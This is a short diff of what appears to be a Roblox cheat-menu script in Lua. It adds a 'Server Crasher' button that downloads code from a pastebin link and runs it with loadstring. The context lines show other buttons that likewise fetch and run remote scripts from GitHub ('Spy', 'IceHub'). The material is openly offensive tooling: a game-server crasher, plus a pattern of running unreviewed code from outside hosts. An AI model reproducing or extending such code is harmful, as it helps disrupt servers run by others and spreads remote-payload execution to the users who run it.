@@ -38,6 +38,10 @@ Section:NewButton("Spy", "Spy", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MichaelScripter/MiniScript/main/Spy%20gui.lua"))()
 end)
 
+Section:NewButton("Server Crasher", "Server Crasher", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/yfN4Y1tU"))()
+end)
+
 Section:NewButton("IceHub", "ICEHUB", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
 end)
